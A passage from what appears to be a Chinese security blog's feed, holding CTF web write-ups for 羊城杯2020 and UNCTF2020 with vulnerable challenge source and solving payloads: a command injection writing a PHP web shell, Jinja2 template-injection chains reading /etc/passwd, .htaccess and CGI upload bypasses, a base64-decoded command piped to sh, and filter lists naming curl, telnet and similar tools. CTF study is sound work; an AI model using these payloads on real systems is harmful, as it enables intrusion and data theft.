class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;count is here&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;style&gt;</span><br><span class="line"></span><br><span class="line">        html,</span><br><span class="line">        body &#123;</span><br><span class="line">            overflow: none;</span><br><span class="line">            max-height: <span class="number">100</span>vh;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;center&gt;&lt;img src=<span class="string">&quot;question.jpg&quot;</span> height=<span class="string">&quot;200&quot;</span> width=<span class="string">&quot;200&quot;</span> /&gt; &lt;/center&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">&#x27;pass&#x27;</span>] !== getenv(<span class="string">&#x27;PASS&#x27;</span>)) &#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;PASS&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;hacker&gt;&#x27;</span>.<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;404&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;Sorry, only people from GWHT are allowed to access this website.&#x27;</span>.<span class="string">&#x27;23333&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;A Counter is here, but it has someting wrong&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> value=<span class="string">&quot;GWHT.php&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">        &lt;textarea style=<span class="string">&quot;border-radius: 1rem;&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;count&quot;</span> rows=<span class="number">10</span> cols=<span class="number">50</span>&gt;&lt;/textarea&gt;&lt;br /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&quot;count&quot;</span>])) &#123;</span><br><span class="line">        $count = $_GET[<span class="string">&quot;count&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#x27;</span>, $count))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;The Count is: &quot;</span> . exec(<span class="string">&#x27;printf \&#x27;&#x27;</span> . $count . <span class="string">&#x27;\&#x27; | wc -c&#x27;</span>) . <span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>check.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pass = <span class="string">&quot;GWHT&quot;</span>;</span><br><span class="line"><span class="comment">// Cookie password.</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Here is nothing, isn&#x27;t it ?&quot;</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Location: /&#x27;</span>);</span><br></pre></td></tr></table></figure><p>读到Cookie是GWHT，接下来就是命令执行<code>exec('printf \'' . $count . '\' | wc -c')</code></p><p>exec命令无回显，可以直接写入shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;| echo &quot;&lt;?&#x3D;eval(\$_POST[&#39;shell&#39;])?&gt;&quot; &gt; shell.php ||&#39;</span><br></pre></td></tr></table></figure><p>另外base64还有一种绕过方式：<code>%6%32</code>，<code>%32</code>是2，拼接成<code>%62</code>就是字母<code>b</code>了。</p><h2 id="BlackCat">BlackCat</h2><p>首页提示你听歌，把MP3下载到本地，用010 Editor打开，文件末尾隐藏着PHP代码</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210224100.png" alt=""></p><p>copy下来放到sublime中审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">&#x27;One-ear&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Ë­£¡¾¹¸Ò²ÈÎÒÒ»Ö»¶úµÄÎ²°Í£¡&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$clandestine = getenv(<span class="string">&quot;clandestine&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;White-cat-monitor&#x27;</span>]))</span><br><span class="line">    $clandestine = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;White-cat-monitor&#x27;</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hh = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;One-ear&#x27;</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($hh !== $_POST[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ÓÐÒâÃé×¼£¬ÎÞÒâ»÷·¢£¬ÄãµÄÃÎÏë¾ÍÊÇÄãÒªÃé×¼µÄÄ¿±ê¡£ÏàÐÅ×Ô¼º£¬Äã¾ÍÊÇÄÇ¿ÅÉäÖÐ°ÐÐÄµÄ×Óµ¯¡£&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">&quot;nc&quot;</span>.$_POST[<span class="string">&#x27;One-ear&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>中文存在乱码，不过不影响审计过程。<code>hash_mac</code>在官方文档中的第一个Note提到了一个trick：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210224304.png" alt=""></p><p>第二个参数如果是数组的话，那么这个函数会生成一个warning，并且返回NULL，那么相当于<code>$clandetine</code>参数可控。payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">White-cat-monitor[]&#x3D;1&amp;One-ear&#x3D;;cat flag.php&amp;Black-CatSheriff&#x3D;04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;羊城杯2020-Web-Writeup&quot;&gt;羊城杯2020 Web Writeup&lt;/h1&gt;
&lt;p&gt;当时没时间打，现在题目在GitHub上开源了，随便看看。&lt;/p&gt;
&lt;h2 id=&quot;easycon&quot;&gt;easycon&lt;/h2&gt;
&lt;p&gt;蚁剑连接一句话，下载bbbbbbb
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>UNCTF2020-Web-Writeup</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/27.UNCTF2020-Web-Writeup/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/27.UNCTF2020-Web-Writeup/</id>
    <published>2020-11-19T05:41:51.000Z</published>
    <updated>2020-11-19T06:09:14.166Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UNCTF2020-Web-wp">UNCTF2020 Web wp</h1><h2 id="easyssrf-solved">easyssrf [solved]</h2><p>算是签到题，比较easy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unctf.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure><h2 id="easyflask-solved">easyflask [solved]</h2><p>Fuzz了一下，发现过滤挺多东西的。<br>只能用管道+join的方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_</span><br></pre></td></tr></table></figure><p>等价于<code>().__class__</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base</span><br></pre></td></tr></table></figure><p>等价于<code>().__class__.__base__</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses</span><br></pre></td></tr></table></figure><p><code>().__class__.__base__.subclasses()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(475)&#125;</span><br></pre></td></tr></table></figure><p><code>().__class__.base__.subclasses().pop(475)</code><br>click.utils.LazyFile</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(475)(request.args.path).read()&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses&amp;path&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>但是不知道flag在哪，所以还是要执行系统命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(64)&#125;&#125;</span><br></pre></td></tr></table></figure><p>选取的模块<code>&lt;class '_frozen_importlib._DummyModuleLock'&gt;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(64)|attr((request.args.usc*2,request.args.init,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.globals,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.builtins,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.import,request.args.usc*2)|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses&amp;init&#x3D;init&amp;globals&#x3D;globals&amp;builtins&#x3D;builtins&amp;import&#x3D;import</span><br></pre></td></tr></table></figure><p><code>().__class__.base__.subclasses().pop(64).__init__.__globals__.__import__</code><br>还是没能搞出来<br>最后还是通过读文件的方式，首先尝试<code>proc/self/cwd</code>和<code>/proc/self/environ</code>，直接返回500，应该是权限不够，再尝试读取<code>/proc/self/cmdline</code>，显示项目是在<code>/app</code>下面，再看<code>/app/app.py</code>发现可以成功读取源码，那就猜了一波flag应该在这个路径下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;secret_route_you_do_not_know?guess&#x3D;&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(475)(request.args.path).read()&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses&amp;path&#x3D;&#x2F;app&#x2F;flag.txt</span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://www.jianshu.com/p/a736e39c3510">https://www.jianshu.com/p/a736e39c3510</a><br><a href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#flask-%E6%94%B9">https://misakikata.github.io/2020/04/python-沙箱逃逸与SSTI/#flask-改</a><br><a href="https://blog.csdn.net/weixin_43536759/article/details/105066445">https://blog.csdn.net/weixin_43536759/article/details/105066445</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---filter-bypass">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection#jinja2---filter-bypass</a></p><p>赛后看预期解我好像做的太麻烦了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;((session|attr(request.headers.x))|attr(request.headers.x1)).get(request.headers.x2).get(request.headers.x3)(request.headers.x4).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>header的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x: __init__</span><br><span class="line">x1: __globals__</span><br><span class="line">x2: __builtins__</span><br><span class="line">x3: open</span><br><span class="line">x4: app.py(flag.txt)</span><br></pre></td></tr></table></figure><h2 id="easyunserialize-solved">easyunserialize [solved]</h2><p>反序列化字符逃逸<br>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="babyeval-solved">babyeval [solved]</h2><p>命令执行可以直接包含文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;include&quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;</span><br></pre></td></tr></table></figure><h2 id="easyfind-solved">easyfind [solved]</h2><p>一开始不给hint都没什么思路，后来放了一个hint：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(is_file($name)===<span class="literal">false</span>))&#123;flag&#125;<span class="keyword">else</span>&#123;no flag&#125;</span><br></pre></td></tr></table></figure><p>is_file函数接收一个数组的时候回返回Null</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name[]&#x3D;0</span><br></pre></td></tr></table></figure><h2 id="easy-upload-solved">easy_upload [solved]</h2><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119105131.png" alt=""></p><p>检查文件名后缀、文件类型，过滤了<code>perl|pyth|ph|auto|curl|base|\|&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet</code>，不检查是否有图片头。</p><p><code>.htaccess</code>文件名是可以上传的，用换行绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AddHandler p\</span><br><span class="line">ph5-script .txt</span><br><span class="line">p\</span><br><span class="line">hp_value au\</span><br><span class="line">to_append_file &#x2F;flag</span><br></pre></td></tr></table></figure><p>然后在随便上传一个txt文件，访问对应路径即可。</p><p>然后我写wp的时候发现，这道题目过滤被改了，增加了一个<code>\</code>，所以上面的这种换行绕过就没办法bypass了。</p><p>来学一个新姿势，上传.htaccess，开启cgi支持，上传cgi脚本，执行cgi脚本，输出flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .xx</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119130328.png" alt=""></p><p>再上传cgi文件，这个文件必须要在Linux/macOS环境下编写，使用vim就行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">echo &quot;Content-Type: text&#x2F;plain&quot;</span><br><span class="line">echo &quot;&quot;</span><br><span class="line">cat &#x2F;flag</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>然后上传的时候最好也要直接上传文件，抓包修改文件类型，最后再放包，不然可能会出现500的错误。</p><h2 id="UN’s-online-tools-solved">UN’s_online_tools [solved]</h2><p>命令执行绕过的题目，当前目录下只有index.php，用sort读取源代码，过滤空格和<code>$</code>，用<code>%09</code>来绕过。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119131410.png" alt=""></p><p>从源码中可以看到禁用了<code>/(;|'| |&gt;|]|&amp;| |\\$|\\|rev|more|tailf|head|nl|tail|tac|cat|rm|cp|mv|\*|\&#123;)/i</code></p><p>用ls命令看到flag在根目录下，base64编码一下</p><p><code>127.0.0.1|echo%09Y2F0IC9mbGFn|base64%09-d|sh</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119133907.png" alt=""></p><h2 id="easyphp">easyphp</h2><p>PHP代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$adminPassword = <span class="string">&#x27;d8b8caf4df69a81f2815pbcb74cd73ab&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;fuxkSQL&#x27;</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fuxkSQL</span>(<span class="params">$iText</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $oText = $iText;</span><br><span class="line">        $oText = str_replace(<span class="string">&#x27;\\\\&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">&#x27;\&quot;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">&quot;\&#x27;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&#x27;&#x27;&quot;</span>, $oText);</span><br><span class="line">        <span class="keyword">return</span> $oText;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;getVars&#x27;</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getVars</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $totals = array_merge($_GET, $_POST);</span><br><span class="line">        <span class="keyword">if</span> (count($_GET)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">                <span class="keyword">global</span> $&#123;$key&#125;;</span><br><span class="line">                <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">                    $temp_array = <span class="keyword">array</span>();</span><br><span class="line">                    <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $key2 =&gt; $value2) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (function_exists(<span class="string">&#x27;mysql_real_escape_string&#x27;</span>)) &#123;</span><br><span class="line">                            $temp_array[$key2] = fuxkSQL(trim($value2));</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            $temp_array[$key2] = str_replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&#x27;&quot;</span>, (trim($value2))));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $&#123;$key&#125; = $_GET[$key] = $temp_array;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (function_exists(<span class="string">&#x27;mysql_real_escape_string&#x27;</span>)) &#123;</span><br><span class="line">                        $&#123;$key&#125; = fuxkSQL(trim($value));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        $&#123;$key&#125; = $_GET[$key] = str_replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&#x27;&quot;</span>, (trim($value))));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getVars();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($source)) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//只有admin才能设置环境变量</span></span><br><span class="line"><span class="keyword">if</span> (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you can set config variables!!&#x27;</span> . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">&quot;\$<span class="subst">$key</span>&quot;</span> . <span class="string">&#x27;=&quot;&#x27;</span> . $GLOBALS[$key] . <span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, $key)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> ($GLOBALS[$key]) . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题考点是变量覆盖，弱类型和PHP复杂变量的解析。做出了前两个考点，倒在了第三个考点，没想到用复杂变量。</p><p>第一关</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">  <span class="keyword">global</span> $&#123;$key&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$&#123;$key&#125;=$value</code>可以导致变量覆盖，也就是说我们将$password覆盖为任意值，然后将$adminPassword覆盖为其md5值。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password&#x3D;ca01h&amp;adminPassword&#x3D;0f5ed8a8d8d44d86a570aacffa922251&amp;source&#x3D;</span><br></pre></td></tr></table></figure><p>第二关</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha1($verif) == $verif</span><br></pre></td></tr></table></figure><p>简单的PHP弱类型绕过，payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?verif&#x3D;0e00000000000000000000081614617300000000</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://github.com/spaze/hashes">https://github.com/spaze/hashes</a></p></blockquote><p>第三关</p><figure class="highlight 